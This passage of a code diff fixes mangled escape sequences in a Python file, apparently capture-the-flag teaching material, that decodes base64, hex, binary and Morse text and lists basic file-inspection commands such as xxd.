 print(f"Скрытые данные: {hidden}")
 \`\`\`
 
@@ -3116,7 +3116,7 @@ def decode_various(data: str) -> dict:
         decoded = base64.b64decode(data).decode('utf-8', errors='replace')
         if decoded.isprintable():
             results["base64"] = decoded
-    e\xcept E\xception:
+    except Exception:
         pass
 
     # Base32
@@ -3125,7 +3125,7 @@ def decode_various(data: str) -> dict:
         decoded = base64.b32decode(padded.upper()).decode('utf-8', errors='replace')
         if decoded.isprintable():
             results["base32"] = decoded
-    e\xcept E\xception:
+    except Exception:
         pass
 
     # Hex
@@ -3133,7 +3133,7 @@ def decode_various(data: str) -> dict:
         decoded = bytes.fromhex(data).decode('utf-8', errors='replace')
         if decoded.isprintable():
             results["hex"] = decoded
-    e\xcept E\xception:
+    except Exception:
         pass
 
     # Binary
@@ -3144,7 +3144,7 @@ def decode_various(data: str) -> dict:
                 chr(int(clean[i:i+8], 2)) for i in range(0, len(clean), 8)
             )
             results["binary"] = decoded
-    e\xcept E\xception:
+    except Exception:
         pass
 
     # Decimal ASCII
@@ -3153,7 +3153,7 @@ def decode_various(data: str) -> dict:
         if all(n.isdigit() and 0 <= int(n) <= 127 for n in nums):
             decoded = ''.join(chr(int(n)) for n in nums)
             results["decimal_ascii"] = decoded
-    e\xcept E\xception:
+    except Exception:
         pass
 
     # Morse
@@ -3175,7 +3175,7 @@ def decode_various(data: str) -> dict:
         decoded = ' '.join(decoded_words)
         if '?' not in decoded and decoded:
             results["morse"] = decoded
-    e\xcept E\xception:
+    except Exception:
         pass
 
     return results
@@ -3245,7 +3245,7 @@ def solve_layered_crypto(ciphertext: str) -> str:
         decoded = base64.b64decode(data).decode()
         data = decoded
         layers.append("base64")
-    e\xcept E\xception:
+    except Exception:
         pass
 
     # Слой 2: Hex
@@ -3253,7 +3253,7 @@ def solve_layered_crypto(ciphertext: str) -> str:
         decoded = bytes.fromhex(data).decode()
         data = decoded
         layers.append("hex")
-    e\xcept E\xception:
+    except Exception:
         pass
 
     # Слой 3: ROT13
@@ -3336,7 +3336,7 @@ def forensics_challenge_approach(file_info: dict) -> list:
     # Шаг 1: Определяем тип
     steps.append({
         "action": "file identification",
-        "commands": ["file suspect.bin", "x\xd suspect.bin | head -5"],
+        "commands": ["file suspect.bin", "xxd suspect.bin | head -5"],
     })
 
     # Шаг 2: Ищем строки
@@ -3363,7 +3363,7 @@ def forensics_challenge_approach(file_info: dict) -> list:
     # Шаг 5: Hex-анализ
     steps.append({
         "action": "hex analysis",
-        "commands": ["x\xd suspect.bin | less"],
+        "commands": ["xxd suspect.bin | less"],
         "look_for": ["Необычные паттерны", "Скрытые секции", "EOF маркеры"],
     })
 
